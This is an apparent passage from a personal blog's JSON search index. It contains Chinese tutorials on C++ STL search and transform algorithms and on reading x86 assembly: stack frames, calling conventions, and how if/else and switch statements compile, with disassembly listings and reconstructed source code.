0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"常用的查找算法","slug":"cpp0090-常用的查找算法","date":"2021-07-24T18:33:46.000Z","updated":"2021-07-26T14:36:00.025Z","comments":true,"path":"2021/07/25/cpp0090-常用的查找算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/25/cpp0090-常用的查找算法/","excerpt":"","text":"adjacent_find() binary_search() binary_search() count() count_if() find() find_if() adjacent_find() 在iterator对标识元素范围内，查找一对相邻重复元素，找到则返回指向这对元素的第一个元素的迭代器。否则返回past-the-end。 1234567891011121314151617vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(2);​ vecInt.push_back(2);​ vecInt.push_back(4);​ vecInt.push_back(5);vecInt.push_back(5); ​ vector&lt;int&gt;::iterator it = adjacent_find(vecInt.begin(), vecInt.end()); //*it == 2 binary_search 在有序序列中查找value,找到则返回true。注意：在无序序列中，不可使用。 123456789101112131415 set&lt;int&gt; setInt;​ setInt.insert(3);​ setInt.insert(1);​ setInt.insert(7);​ setInt.insert(5);​ setInt.insert(9); ​ bool bFind = binary_search(setInt.begin(),setInt.end(),5); count() 利用等于操作符，把标志范围内的元素与输入值比较，返回相等的个数。 1234567891011121314151617vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(2);​ vecInt.push_back(2);​ vecInt.push_back(4);​ vecInt.push_back(2);​ vecInt.push_back(5);​ int iCount = count(vecInt.begin(),vecInt.end(),2); //iCount==3​ count_if() 假设vector&lt;int&gt; vecIntA，vecIntA包含1,3,5,7,9元素 1234567891011121314151617181920212223242526272829//先定义比较函数bool GreaterThree(int iNum)&#123;​ if(iNum&gt;=3)​ &#123;​ return true;​ &#125;​ else​ &#123;​ return false;​ &#125;&#125; int iCount = count_if(vecIntA.begin(), vecIntA.end(), GreaterThree);//此时iCount == 4 find() find: 利用底层元素的等于操作符，对指定范围内的元素与输入值进行比较。当匹配时，结束搜索，返回该元素的迭代器。 equal_range: 返回一对iterator，第一个表示lower_bound,第二个表示upper_bound。 123456789101112131415vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(3);​ vecInt.push_back(5);​ vecInt.push_back(7);​ vecInt.push_back(9); vector&lt;int&gt;::iterator it = find(vecInt.begin(), vecInt.end(), 5); //*it == 5 find_if() find_if: 使用输入的函数代替等于操作符执行find。返回被找到的元素的迭代器。 假设vector&lt;int&gt; vecIntA，vecIntA包含1,3,5,3,9元素 vector&lt;int&gt;::it = find_if(vecInt.begin(),vecInt.end(),GreaterThree); 此时*it==3, *(it+1)==5, *(it+2)==3, *(it+3)==9 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;using namespace std;void test_adjacent_find()&#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); //在iterator对标识元素范围内， //查找一对相邻重复元素，找到则返回指向这对元素的第一个元素的迭代器。否则返回past-the-end。 vector&lt;int&gt;::iterator it = adjacent_find(v.begin(), v.end()); cout &lt;&lt; \"*it: \" &lt;&lt; *it &lt;&lt; endl; //distance 返回迭代器it元素在v容器中的位置(索引) cout &lt;&lt; \"distance: \" &lt;&lt; distance(v.begin(),it) &lt;&lt; endl;&#125;void test_binary_search() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); //需要先排序 if (binary_search(v.begin(), v.end(), 5)) &#123; cout &lt;&lt; \"yes\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"no\" &lt;&lt; endl; &#125; &#125;void test_count() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); cout &lt;&lt; \"count: \" &lt;&lt; count(v.begin(), v.end(), 3) &lt;&lt; endl;&#125;bool Com(int x) &#123; if (x &gt; 3) &#123; return true; &#125; return false;&#125;void test_countif() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); cout &lt;&lt; \"count_if: \" &lt;&lt; count_if(v.begin(), v.end(), Com) &lt;&lt; endl;&#125;void test_find() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); vector&lt;int&gt;::iterator it = find(v.begin(),v.end(),-1); cout &lt;&lt; \"*it: \" &lt;&lt; *it &lt;&lt; endl; cout &lt;&lt; \"distance: \" &lt;&lt; distance(v.begin(),it) &lt;&lt; endl;&#125;class ComP &#123;public: bool operator()(int x) &#123; if (x &gt; 3) &#123; return true; &#125; return false; &#125;private:&#125;;void test_findif() &#123; vector&lt;int&gt; v; v.push_back(0); v.push_back(1); v.push_back(2); v.push_back(3); v.push_back(3); v.push_back(5); v.push_back(-1); cout &lt;&lt; \"find_if: \" &lt;&lt; *(find_if(v.begin(), v.end(), ComP())) &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test_adjacent_find(); test_binary_search(); test_count(); test_countif(); test_find(); test_findif(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"foreach和transform算法","slug":"cpp0089-foreach和transform算法","date":"2021-07-24T15:28:16.000Z","updated":"2021-07-26T14:32:09.681Z","comments":true,"path":"2021/07/24/cpp0089-foreach和transform算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/24/cpp0089-foreach和transform算法/","excerpt":"","text":"foreach和transform算法 for_each() for_each(迭代器起始位置,迭代器结束位置,函数对象或回调函数) for_each: 用指定函数依次对指定范围内所有元素进行迭代访问。该函数不得修改序列中的元素。 for_each()会返回一个新的函数对象 一般情况下：for_each所使用的函数对象，参数是引用，没有返回值 123456789101112void show(const int &amp;iItem)&#123; cout &lt;&lt; iItem;&#125;main()&#123; int iArray[] = &#123;0,1,2,3,4&#125;; vector&lt;int&gt; vecInt(iArray,iArray+sizeof(iArray)/sizeof(iArray[0])); for_each(vecInt.begin(), vecInt.end(), show);//结果打印出0 1 2 3 4&#125; transform() transform: 与for_each类似，遍历所有元素，但可对容器的元素进行修改 transform(迭代器起始位置,迭代器结束位置,迭代器x起始位置,函数对象或回调函数) transform所使用的函数对象，参数一般不使用引用，而是还有返回值 1234567891011121314151617int increase (int i) &#123; return i+1; &#125; main() &#123; vector&lt;int&gt; vecIntA; vecIntA.push_back(1); vecIntA.push_back(3); vecIntA.push_back(5); vecIntA.push_back(7); vecIntA.push_back(9); transform(vecIntA.begin(),vecIntA.end(),vecIntA.begin(),increase); //vecIntA : &#123;2,4,6,8,10&#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188#include &lt;iostream&gt;using namespace std;#include &quot;string&quot;#include &lt;vector&gt;#include &lt;list&gt;#include &quot;set&quot;#include &lt;algorithm&gt;#include &quot;functional&quot;#include &quot;iterator&quot; //输出流迭代器的头文件void printV(vector&lt;int&gt; &amp;v)&#123; for (vector&lt;int&gt;::iterator it=v.begin(); it!=v.end(); it++) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125;&#125;void printList(list&lt;int&gt; &amp;v)&#123; for (list&lt;int&gt;::iterator it=v.begin(); it!=v.end(); it++) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125;&#125;void showElem(int &amp;n)&#123; cout &lt;&lt; n &lt;&lt; &quot; &quot;;&#125;class CMyShow&#123;public: CMyShow() &#123; num = 0; &#125; void operator()(int &amp;n) &#123; num ++; cout &lt;&lt; n &lt;&lt; &quot; &quot;; &#125; void printNum() &#123; cout &lt;&lt; &quot;num:&quot; &lt;&lt; num &lt;&lt; endl; &#125;protected:private: int num;&#125;;void main41_foreach()&#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); printV(v1); cout &lt;&lt; endl; /* template&lt;class _InIt, class _Fn1&gt; inline _Fn1 for_each(_InIt _First, _InIt _Last, _Fn1 _Func) &#123; // perform function for each element _DEBUG_RANGE(_First, _Last); _DEBUG_POINTER(_Func); return (_For_each(_Unchecked(_First), _Unchecked(_Last), _Func)); &#125; */ //函数对象 回调函数入口地址 for_each(v1.begin(), v1.end(), showElem); cout &lt;&lt; endl; for_each(v1.begin(), v1.end(), CMyShow()); cout &lt;&lt; endl; CMyShow mya; CMyShow my1 = for_each(v1.begin(), v1.end(),mya); //给my1初始化 mya.printNum(); //ma1和my1 是两个不同的对象 my1.printNum(); my1 = for_each(v1.begin(), v1.end(),mya); //给my1赋值 my1.printNum();&#125;int increase(int i)&#123; return i+100;&#125;void main42_transform()&#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); printV(v1); cout &lt;&lt; endl; //transform 使用回调函数 transform(v1.begin(), v1.end(), v1.begin(), increase ); printV(v1); cout &lt;&lt; endl; //transform 使用 预定义的函数对象 transform(v1.begin(), v1.end(), v1.begin(), negate&lt;int&gt;() ); printV(v1); cout &lt;&lt; endl; //transform 使用 函数适配器 和函数对象 list&lt;int&gt; mylist; mylist.resize( v1.size() ); transform(v1.begin(), v1.end(), mylist.begin(), bind2nd( multiplies&lt;int&gt;(), 10 ) ); printList(mylist); cout &lt;&lt; endl; //transform 也可以把运算结果 直接输出到屏幕 transform(v1.begin(), v1.end(), ostream_iterator&lt;int&gt;(cout, &quot; &quot; ), negate&lt;int&gt;() ); cout &lt;&lt; endl;&#125;//一般情况下：for_each所使用的函数对象，参数是引用，没有返回值//transform所使用的函数对象，参数一般不使用引用，而是还有返回值int showElem2(int n)&#123; cout &lt;&lt; n &lt;&lt; &quot; &quot;; return n;&#125;void main43_transform_pk_foreach()&#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); vector&lt;int&gt; v2 = v1; for_each(v1.begin(), v1.end(), showElem); //transform 对 函数对象的要求 /*c:\\program files\\microsoft visual studio 10.0\\vc\\include\\algorithm(1119): 参见对正在编译的函数 模板 实例化 “_OutIt std::_Transform1&lt;int*,_OutIt, void(__cdecl *)(int &amp;)&gt;(_InIt,_InIt,_OutIt,_Fn1, std::tr1::true_type)”的引用1&gt; with1&gt; [1&gt; _OutIt=std::_Vector_iterator&lt;std::_Vector_val&lt;int,std::allocator&lt;int&gt;&gt;&gt;,1&gt; _InIt=int *,1&gt; _Fn1=void (__cdecl *)(int &amp;)1&gt; ] */ /* template&lt;class _InIt, class _OutIt, class _Fn1&gt; inline _OutIt _Transform(_InIt _First, _InIt _Last, _OutIt _Dest, _Fn1 _Func) &#123; // transform [_First, _Last) with _Func for (; _First != _Last; ++_First, ++_Dest) *_Dest = _Func(*_First); //解释了 为什么 要有返回值 return (_Dest); &#125; */ transform(v2.begin(), v2.end(), v2.begin(), showElem2);&#125;void main()&#123; //main41_foreach(); //main42_transform(); // main43_transform_pk_foreach(); cout&lt;&lt;&quot;hello...&quot;&lt;&lt;endl; system(&quot;pause&quot;); return ;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"23-30","slug":"hbnx003-23-30","date":"2021-07-15T15:33:34.000Z","updated":"2021-07-26T16:57:37.175Z","comments":true,"path":"2021/07/15/hbnx003-23-30/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/15/hbnx003-23-30/","excerpt":"","text":"知识点： CALL框架 EBP寄存器 栈底指针 ESP寄存器 栈顶指针 一、EBP栈底指针 EBP是一个特殊的寄存器，通过EBP+偏移量 可以访问CALL里边的局部变量。它的低16位叫BP。//EAX和AX的关系 二、ESP栈顶指针 ESP栈顶指针与EBP构成的一段空间大小，一般就是本CALL局部变量的空间大小总和。ESP指针配合EBP使用。//SP 三、代码分析 1234567891011121314151617181920212223242526272829void fun1(void)&#123; //0401000 /$ 55 PUSH EBP //保存栈环境或者叫保存EBP指针​ //0401001 |. 8BEC MOV EBP,ESP​ //0401003 |. 5D POP EBP //恢复EBP指针​ //0401004 \\. C3 RETN&#125;void fun2(void)&#123;​ int a;​ int b=5;&#125;void fun3(void)&#123;​ fun2();&#125; 总结： 1、每个CALL会分配一个独立的栈段空间，供局部变量使用. 栈段空间大小一般要大于局部变量所需空间大小之和 ebp-esp=栈段空间大小。 2、CALL栈平衡。进CALL前与出CALL后 EBP和ESP的值不变。 知识点： PUSH POP CALL堆栈平衡 RETN指令 一、PUSH入栈指令 (压栈指令): 格式: PUSH 操作数 //sub esp,4 ;mov [esp],EBP 操作数可以是寄存器，存储器，或者立即数 二、POP出栈指令 （弹栈指令) 格式：POP 操作数 //mov EBP,[esp] ;add esp,4 操作数是寄存器，或者存储器，不能是立即数 三、代码分析 1、测试PUSH和POP 与ESP栈顶指针的关系 2、CALL与ESP的关系 3、总结栈的特点(后进先出) [EBP-??] // 局部变量 [ EBP+??] //上一个CALL 局部变量，上一个CALL传入参数 CALL PUSH EIP RETN POP EIP 知识点： cdecl 函数调用约定 stdcall 函数调用约定 CALL堆栈平衡 配置属性–&gt; c/c++ --&gt;高级–&gt;调用约定 一、cdecl调用约定 VC++默认约定__cdecl 1、源代码 1234567int __cdecl add1(int a,int b)&#123;​ return a+b;&#125; 2、生成汇编代码 123456789101100401000 /$ 55 PUSH EBP00401001 |. 8BEC MOV EBP,ESP00401003 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]00401006 |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]00401009 |. 5D POP EBP0040100A \\. C3 RETN ; POP EIP 3、调用代码 123456789101112131415push bpush acall add1add esp,800401031 |. 6A 02 PUSH 2 ; 0012FF7C00401033 |. 6A 01 PUSH 100401035 |. E8 C6FFFFFF CALL stdcall_.00401000 ; __cdecl add10040103A |. 83C4 08 ADD ESP,8 ; RETN 8 二、stdcall调用约定 API函数约定 __stdcall 1、源代码 1234567 int __stdcall add2(int a,int b)&#123;​ return a+b;&#125; 2、生成汇编代码 123456789101100401010 /$ 55 PUSH EBP00401011 |. 8BEC MOV EBP,ESP00401013 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]00401016 |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]00401019 |. 5D POP EBP0040101A \\. C2 0800 RETN 8 ; RETN 8 //ADD ESP,8 3、调用代码 1234567891011push bpush acall add20040103D |. 6A 04 PUSH 4 ; 0012FF7C0040103F |. 6A 03 PUSH 300401041 |. E8 CAFFFFFF CALL stdcall_.00401010 ; __stdcall add2 PUSH 下一个EIP 知识点： fastcall 函数调用约定 CALL堆栈平衡 三、__fastcall 函数调用约定 直接用寄存器传递参数，由于寄存器相对于栈(存储器)速度要快上许多，所以这类的调用约定叫fastcall 1、源代码 1234567 int __fastcall add2(int a,int b)&#123;​ return a+b;&#125; 2、汇编代码 1234567891011121314151617181900401020 /$ 55 PUSH EBP00401021 |. 8BEC MOV EBP,ESP00401023 |. 83EC 08 SUB ESP,8 ; int a,b;00401026 |. 8955 F8 MOV DWORD PTR SS:[EBP-8],EDX ; b=edx00401029 |. 894D FC MOV DWORD PTR SS:[EBP-4],ECX ; a=ecx0040102C |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040102F |. 0345 F8 ADD EAX,DWORD PTR SS:[EBP-8]00401032 |. 8BE5 MOV ESP,EBP ; add esp,800401034 |. 5D POP EBP00401035 \\. C3 RETN 3、调用代码 1234500401096 |. BA 02000000 MOV EDX,20040109B |. B9 01000000 MOV ECX,1004010A0 |. E8 7BFFFFFF CALL fastcall.00401020 ; 3 一般超过两个参数,就会使用栈来存储其他参数 123456789101112131415161718192021222324252627282930313233int __fastcall add4(int a, int b,int c,int d,int e) &#123; return a + b + c + d + e;&#125;00F4112B . 6A 05 push 0x5 ; 002FF83800F4112D . 6A 04 push 0x400F4112F . 6A 03 push 0x300F41131 . BA 02000000 mov edx,0x200F41136 B9 db B900F41137 01 db 0100F41138 00 db 0000F41139 00 db 0000F4113A &gt; 00 db 00 ; 002FF83800F4113B . E8 80FFFFFF call ConsoleA.00F410C000F410C0 /$ 55 push ebp00F410C1 |. 8BEC mov ebp,esp00F410C3 |. 83EC 08 sub esp,0x800F410C6 |. 8955 F8 mov [local.2],edx00F410C9 |. 894D FC mov [local.1],ecx00F410CC |. 8B45 FC mov eax,[local.1]00F410CF |. 0345 F8 add eax,[local.2]00F410D2 |. 0345 08 add eax,[arg.1]00F410D5 |. 0345 0C add eax,[arg.2]00F410D8 |. 0345 10 add eax,[arg.3]00F410DB |. 8BE5 mov esp,ebp00F410DD |. 5D pop ebp00F410DE \\. C2 0C00 retn 0xC 知识点： if else 逆向还原代码 一、了解if else结构 123456789101112131415161718192021sub esp,800401029 |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040102C |. 3B45 F8 CMP EAX,DWORD PTR SS:[EBP-8]0040102F |. 7E 10 JLE SHORT ifelse01.00401041 //表示 else部分的开始00401031 |. 68 FC204000 PUSH ifelse01.004020FC ; /format = &quot;a&gt;b&quot;00401036 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040103C |. 83C4 04 ADD ESP,40040103F |. EB 0E JMP SHORT ifelse01.0040104F //结合前边的 jle 401041 判断是否有else部分00401041 |&gt; 68 00214000 PUSH ifelse01.00402100 ; /format = &quot;b&gt;=a&quot;00401046 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf0040104C |. 83C4 04 ADD ESP,4 二、逆向还原代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364 int a,b,c;//00401006 |. 68 F4204000 PUSH ifelse01.004020F4 ; /format = &quot;begin&quot;//0040100B |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401011 |. 83C4 04 ADD ESP,4 printf(&quot;begin&quot;);//00401014 |. C745 FC 01000&gt;MOV DWORD PTR SS:[EBP-4],1//0040101B |. C745 F8 02000&gt;MOV DWORD PTR SS:[EBP-8],2//00401022 |. C745 F4 03000&gt;MOV DWORD PTR SS:[EBP-C],3 a=1,b=2,c=3;//00401029 |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]//0040102C |. 3B45 F8 CMP EAX,DWORD PTR SS:[EBP-8]//0040102F |. 7E 10 JLE SHORT ifelse01.00401041if (a&gt;b)&#123; //00401031 |. 68 FC204000 PUSH ifelse01.004020FC ; /format = &quot;a&gt;b&quot; //00401036 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf //0040103C |. 83C4 04 ADD ESP,4 //0040103F |. EB 0E JMP SHORT ifelse01.0040104F printf(&quot;a&gt;b&quot;);&#125;else&#123; //00401041 |&gt; 68 00214000 PUSH ifelse01.00402100 ; /format = &quot;b&gt;=a&quot; //00401046 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf //0040104C |. 83C4 04 ADD ESP,4 printf(&quot;b&gt;=a&quot;);&#125;//0040104F |&gt; \\8B4D F4 MOV ECX,DWORD PTR SS:[EBP-C] ; c//00401052 |. 3B4D F8 CMP ECX,DWORD PTR SS:[EBP-8] ; b//00401055 |. 7E 46 JLE SHORT ifelse01.0040109D ; if (c&gt;b)if (c&gt;b)&#123;//00401057 |. 8B55 F4 MOV EDX,DWORD PTR SS:[EBP-C] c//0040105A |. 3B55 FC CMP EDX,DWORD PTR SS:[EBP-4] a//0040105D |. 7E 20 JLE SHORT ifelse01.0040107F if (c&gt;a) &#123; //0040105F |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]//00401062 |. 50 PUSH EAX ; /&lt;%d&gt;//00401063 |. 8B4D F4 MOV ECX,DWORD PTR SS:[EBP-C] ; |//00401066 |. 51 PUSH ECX ; |&lt;%d&gt;//00401067 |. 8B55 F8 MOV EDX,DWORD PTR SS:[EBP-8] ; |//0040106A |. 52 PUSH EDX ; |&lt;%d&gt;//0040106B |. 8B45 F4 MOV EAX,DWORD PTR SS:[EBP-C] ; |//0040106E |. 50 PUSH EAX ; |&lt;%d&gt;//0040106F |. 68 08214000 PUSH ifelse01.00402108 ; |format = &quot;%d&gt;%d,%d&gt;%d&quot;//00401074 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//0040107A |. 83C4 14 ADD ESP,14 printf(&quot;%d&gt;%d,%d&gt;%d&quot;,c,b,c,a);//0040107D |. EB 1E JMP SHORT ifelse01.0040109D &#125;else &#123; //0040107F |&gt; 8B4D FC MOV ECX,DWORD PTR SS:[EBP-4]//00401082 |. 51 PUSH ECX ; /&lt;%d&gt;//00401083 |. 8B55 F4 MOV EDX,DWORD PTR SS:[EBP-C] ; |//00401086 |. 52 PUSH EDX ; |&lt;%d&gt;//00401087 |. 8B45 F8 MOV EAX,DWORD PTR SS:[EBP-8] ; |//0040108A |. 50 PUSH EAX ; |&lt;%d&gt;//0040108B |. 8B4D F4 MOV ECX,DWORD PTR SS:[EBP-C] ; |//0040108E |. 51 PUSH ECX ; |&lt;%d&gt;//0040108F |. 68 14214000 PUSH ifelse01.00402114 ; |format = &quot;%d&gt;%d,%d&lt;=%d&quot;//00401094 |. FF15 A0204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//0040109A |. 83C4 14 ADD ESP,14 printf(&quot;%d&gt;%d,%d&lt;=%d&quot;,c,b,c,a); &#125;&#125;//0040109D |&gt; 33C0 XOR EAX,EAX 知识点： switch case生成的汇编框架 逆向汇编代码还原成C++代码 一、了解switch case结构 1、普通情况 12345678910111213141516171819202100401011 |. 83C4 04 ADD ESP,400401014 |. C745 FC 20000&gt;MOV DWORD PTR SS:[EBP-4],20 ; a=20;0040101B |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040101E |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX ; switch (a)00401021 |. 837D F8 03 CMP DWORD PTR SS:[EBP-8],3 ; case 3:00401025 |. 74 0E JE SHORT switchCa.0040103500401027 |. 837D F8 04 CMP DWORD PTR SS:[EBP-8],4 ; case 4:0040102B |. 74 28 JE SHORT switchCa.004010550040102D |. 837D F8 05 CMP DWORD PTR SS:[EBP-8],5 ; case 5:00401031 |. 74 12 JE SHORT switchCa.0040104500401033 |. EB 30 JMP SHORT switchCa.00401065 ; default: 2、跳转表 123456789101112131415161718192021222300401014 |. C745 FC 20000&gt;MOV DWORD PTR SS:[EBP-4],20 ; a=20;0040101B |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040101E |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX ; b=a00401021 |. 8B4D F8 MOV ECX,DWORD PTR SS:[EBP-8] ; b==100401024 |. 83E9 03 SUB ECX,3 ; a-0x3=跳转表数组大小 ecx = a - 最小case值00401027 |. 894D F8 MOV DWORD PTR SS:[EBP-8],ECX0040102A |. 837D F8 0E CMP DWORD PTR SS:[EBP-8],0E ; 0E=case最大常量-case最小常量0040102E |. 77 61 JA SHORT switchCa.00401091 ; default:00401030 |. 8B55 F8 MOV EDX,DWORD PTR SS:[EBP-8] ;edx == local.1 == ecx == a - case最小值00401033 |. 0FB682 CC1040&gt;MOVZX EAX,BYTE PTR DS:[EDX+4010CC] ; 跳转表的索引数组0040103A |&gt; FF2485 B41040&gt;JMP DWORD PTR DS:[EAX*4+4010B4] ; /跳转表 二、逆向还原代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111//00401003 |. 83EC 08 SUB ESP,8 ; int a,b//00401006 |. 68 F4204000 PUSH switchCa.004020F4 ; /format = &quot;begin\\n&quot;//0040100B |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401011 |. 83C4 04 ADD ESP,4 ; a=20//00401014 |. C745 FC 20000&gt;MOV DWORD PTR SS:[EBP-4],20 ; switch (a)//0040101B |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]//0040101E |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX//00401021 |. 8B4D F8 MOV ECX,DWORD PTR SS:[EBP-8]//00401024 |. 83E9 09 SUB ECX,9 ; 23//00401027 |. 894D F8 MOV DWORD PTR SS:[EBP-8],ECX//0040102A |. 837D F8 08 CMP DWORD PTR SS:[EBP-8],8 ; 9..17//0040102E |. 77 4A JA SHORT switchCa.0040107A ; 9,11,15,16,17//00401030 |. 8B55 F8 MOV EDX,DWORD PTR SS:[EBP-8]//00401033 |. FF2495 9C1040&gt;JMP DWORD PTR DS:[EDX*4+40109C] ; 跳转表//0040103A |&gt; 68 FC204000 PUSH switchCa.004020FC ; /format = &quot;aaa&quot;//0040103F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401045 |. 83C4 04 ADD ESP,4//00401048 |. EB 3E JMP SHORT switchCa.00401088//0040104A |&gt; 68 00214000 PUSH switchCa.00402100 ; /format = &quot;aaaa&quot;//0040104F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401055 |. 83C4 04 ADD ESP,4//00401058 |. EB 2E JMP SHORT switchCa.00401088//0040105A |&gt; 68 08214000 PUSH switchCa.00402108 ; /format = &quot;bbbb&quot;//0040105F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401065 |. 83C4 04 ADD ESP,4//00401068 |. EB 1E JMP SHORT switchCa.00401088//0040106A |&gt; 68 10214000 PUSH switchCa.00402110 ; /format = &quot;xxxx&quot;//0040106F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf//00401075 |. 83C4 04 ADD ESP,4//00401078 |. EB 0E JMP SHORT switchCa.00401088//0040107A |&gt; 68 18214000 PUSH switchCa.00402118 ; /format = &quot;3333&quot;//0040107F |. FF15 A4204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf //Default//00401085 |. 83C4 04 ADD ESP,4//00401088 |&gt; 68 20214000 PUSH switchCa.00402120 ; /command = &quot;pause&quot;//0040108D |. FF15 9C204000 CALL DWORD PTR DS:[&lt;&amp;MSVCR90.system&gt;] ; \\system//00401093 |. 83C4 04 ADD ESP,4​ printf(&quot;begin&quot;);​ int a=0x20;​ switch(a)​ &#123; ​ case 11:​ printf(&quot;aaa&quot;);​ break;​ case 15:​ printf(&quot;aaaa&quot;);​ break;​ case 17:​ printf(&quot;bbbb&quot;);​ break;​ case 9:​ printf(&quot;xxxx&quot;);​ break; ​ default:​ printf(&quot;3333&quot;);​ break;​ &#125; ## 知识点： 入口函数main的定位 逆向汇编代码还原成C++代码 索引表数组 跳转表 设置程序的入口基址 最少要大于等于0x10000 找入口main函数 双击进入就是main函数的入口位置了 一、索引表及跳转表分析 1、确定case常量 18,20,28,32 2、确定case常量顺序 (可以根据 跳转表 调整也可以) 000210AC 00021063 30.00021063 18 000210B0 00021053 30.00021053 20 000210B4 00021048 30.00021048 28 000210B8 00021089 30.00021089 32 **// 调整后实际上就是按地址大小排序 ** 000210B4 00021048 30.00021048 28 000210B0 00021053 30.00021053 20 000210AC 00021063 30.00021063 18 000210B8 00021089 30.00021089 32 二、还原代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455printf(&quot;begin&quot;);​ int a,b; a=0x16; b=3;​ switch(a)​ &#123;​ case 28:​ b=b+a;​ break;​ case 20:​ printf(&quot;123&quot;);​ break;​ //18,20,28,32​ case 18:​ if (b&gt;9)​ &#123;​ printf(&quot;3333&quot;);​ &#125;else​ &#123;​ printf(&quot;2222&quot;);​ &#125;​ break; ​ case 32:​ printf(&quot;321&quot;);​ //break;​ default:​ printf(&quot;00end&quot;);​ break;​ &#125;​ //end","categories":[{"name":"汇编逆向","slug":"汇编逆向","permalink":"https://xiaowuyoucy.github.io/categories/汇编逆向/"}],"tags":[]},{"title":"13-22","slug":"hbnx002-13-22","date":"2021-07-14T14:57:46.000Z","updated":"2021-07-16T19:38:51.223Z","comments":true,"path":"2021/07/14/hbnx002-13-22/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/14/hbnx002-13-22/","excerpt":"","text":"知识点： 条件转移指令JNE/JNZ ZF（零标志） 不等于转移指令 JNE/JNZ (等于JE/JZ) 1、 JNE/JNZ功能 条件转移指令JNE/JNZ //不等于转移 格式: JNE/JNZ 标号 功能: ZF＝0,转至标号地址处执行 2、代码测试 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667 printf(&quot;begin\\n&quot;);​ int a=4;​ //if (a==3) //ZF=0​ //&#123;​ // printf(&quot;未跳转ZF==1\\n&quot;);​ //&#125;​ //printf(&quot;ZF==0跳转\\n&quot;);​ __asm​ &#123; mov eax,3​ sub eax,a //3-4​ jz end; //ZF=1​ &#125;​ 